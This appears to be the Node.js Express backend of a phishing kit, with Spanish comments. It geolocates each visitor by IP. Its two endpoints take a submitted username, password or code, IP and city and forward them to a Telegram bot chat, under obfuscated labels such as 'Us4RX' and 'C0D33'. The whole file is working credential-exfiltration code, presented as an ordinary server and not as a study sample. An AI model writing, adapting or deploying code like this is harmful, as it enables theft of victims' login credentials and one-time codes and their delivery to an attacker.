const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const https = require("https");
const agent = new https.Agent({ family: 4 });



// Al inicio, después de crear la app
app.use(cors({
    origin: '*',             // ← en producción puedes poner dominios específicos
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: false
}));

// Muy importante: manejar preflight (OPTIONS)
app.options('*', cors());   // ← esto resuelve la mayoría de los bloqueos preflight

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

// ... resto del código ...

app.get('/api/get-location', async (req, res) => {
    try {
        // Obtener IP del cliente (mejorado para proxies como Railway)
        let clientIp = 
            req.headers['cf-connecting-ip'] ||                  // Cloudflare
            (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
            req.headers['x-real-ip'] ||
            req.socket.remoteAddress ||
            'unknown';

        if (!clientIp || clientIp === '::1' || clientIp.includes('127.0.0.1') || clientIp === '::ffff:127.0.0.1') {
            clientIp = '8.8.8.8'; // fallback para pruebas locales
        }

        // Opción 1: ipwho.is (muy estable, sin key, ilimitado o límite alto)
        const geoResponse = await axios.get(`https://ipwho.is/${clientIp}`, {
            timeout: 7000
        });

        const data = geoResponse.data;

        // Opción 2 (comentar la de arriba y descomentar si prefieres): ip-api.com
        // const geoResponse = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,city,query`);
        // const data = geoResponse.data;
        // if (data.status !== 'success') throw new Error(data.message || 'ip-api falló');

        res.json({
            ip: clientIp,
            city: data.city || data.region || 'Desconocida',
            // extra si quieres: country: data.country || 'N/A'
        });

    } catch (error) {
        console.error('ERROR en /api/get-location:');
        console.error('Mensaje:', error.message);
        if (error.response) {
            console.error('Status:', error.response.status);
            console.error('Respuesta del servicio:', error.response.data);
        } else if (error.request) {
            console.error('No hubo respuesta (timeout o network issue)');
        } else {
            console.error('Error al preparar request:', error);
        }

        // Respuesta fallback para que el frontend no rompa
        res.status(200).json({
            ip: 'detectada-en-backend',
            city: 'Desconocida'
        });
    }
});

app.post('/api/sendMessage', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔴B3D3V2.0🔴\nUs4RX: ${user}\nContR: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
       const response = await axios.post(
  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
  {
    chat_id: CHAT_ID,
    text: message,
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔴B3D3V2.0🔴\nUs4RX: ${user}\nC0D33: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(
  `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
  {
    chat_id: CHAT_ID,
    text: message,
  },
  { httpsAgent: agent }
);
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});





const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
